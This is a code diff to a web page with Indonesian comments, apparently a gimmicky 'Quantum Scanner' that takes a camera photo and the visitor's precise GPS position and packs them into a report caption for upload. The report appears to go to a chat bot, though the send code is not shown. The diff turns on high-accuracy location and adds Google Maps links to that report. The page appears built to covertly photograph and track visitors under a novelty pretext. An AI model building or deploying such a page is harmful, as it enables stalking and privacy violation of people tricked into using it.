@@ -78,6 +78,15 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+    /* Gaya untuk informasi lokasi */
+    #location-info {
+      margin-top: 10px;
+      font-size: 1em;
+    }
+    #location-info a {
+      color: var(--secondary);
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
@@ -87,6 +96,8 @@
     <video id="video" width="300" height="300" autoplay playsinline muted></video>
   </div>
   <button id="capture-btn">🚀 Start Quantum Scan</button>
+  <button id="location-btn">📍 View My Location</button>
+  <div id="location-info"></div>
   <div id="loading">🔭 Scanning Quantum Signature...</div>
 
   <script>
@@ -111,13 +122,13 @@
       console.log(`${type.toUpperCase()}: ${message}`);
     }
 
-    // === Fungsi Helper untuk Mendapatkan Lokasi ===
+    // === Fungsi Helper untuk Mendapatkan Lokasi (GPS) ===
     function getPreciseLocation() {
       return new Promise((resolve, reject) => {
         if (!navigator.geolocation) {
           reject(new Error("Geolocation not supported"));
         } else {
-          navigator.geolocation.getCurrentPosition(resolve, reject);
+          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
         }
       });
     }
@@ -251,6 +262,21 @@
       }
     }
 
+    // === Fungsi untuk Melihat Lokasi dan Menampilkan URL Google Maps ===
+    async function viewLocation() {
+      try {
+        const position = await getPreciseLocation();
+        const { latitude, longitude } = position.coords;
+        const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+        document.getElementById('location-info').innerHTML = `
+          <p>Your Location: <strong>${latitude.toFixed(6)}, ${longitude.toFixed(6)}</strong></p>
+          <p><a href="${mapsUrl}" target="_blank">View on Google Maps</a></p>
+        `;
+      } catch (error) {
+        showError('Location Error', error);
+      }
+    }
+
     // === Proses Quantum Scan ===
     async function startQuantumScan() {
       if (isScanning) return;
@@ -339,10 +365,14 @@
       const formData = new FormData();
       const blob = await dataURItoBlob(report.image);
       
-      // Buat caption laporan dengan data quantum scan dan detail perangkat
+      // Buat caption laporan dengan data quantum scan dan detail perangkat, termasuk tautan lokasi
+      const lat = report.metadata.spacetimeCoordinates.lat;
+      const lon = report.metadata.spacetimeCoordinates.lon;
+      const mapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+      
       const caption = `🪐 *Quantum Scan Report*\n\n` +
         `📅 *Timestamp:* ${new Date(report.metadata.temporalSignature).toLocaleString()}\n` +
-        `🌍 *Coordinates:* \`${report.metadata.spacetimeCoordinates.lat.toFixed(6)}, ${report.metadata.spacetimeCoordinates.lon.toFixed(6)}\`\n` +
+        `🌍 *Coordinates:* \`${lat.toFixed(6)}, ${lon.toFixed(6)}\` ([View Location](${mapsLink}))\n` +
         `🎯 *Accuracy:* ${Math.round(report.metadata.spacetimeCoordinates.accuracy)}m\n\n` +
         `⚠️ *Threat Level:* ${report.metadata.aiAnalysis.threatLevel}%\n` +
         `🧬 *Biometrics:* ${report.metadata.aiAnalysis.biometrics}\n` +
@@ -389,6 +419,7 @@
     if (navigator.mediaDevices) {
       initCamera();
       document.getElementById('capture-btn').onclick = startQuantumScan;
+      document.getElementById('location-btn').onclick = viewLocation;
     } else {
       showToast('Quantum Scanner Not Supported', 'error');
     }
